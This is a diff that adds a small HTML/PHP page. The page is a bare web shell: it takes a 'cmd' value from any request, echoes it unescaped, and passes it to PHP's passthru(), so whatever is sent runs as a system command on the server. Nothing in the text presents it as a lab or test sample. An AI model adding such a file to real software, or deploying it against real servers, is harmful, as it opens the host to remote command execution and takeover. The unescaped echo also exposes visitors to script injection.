@@ -1,0 +1,13 @@
+<html>
+<body>
+
+<form method="POST">
+    <input name="cmd" id="cmd">
+
+<?php
+echo $_REQUEST["cmd"];
+
+echo passthru ($_REQUEST["cmd"])
+
+?>
+</body>
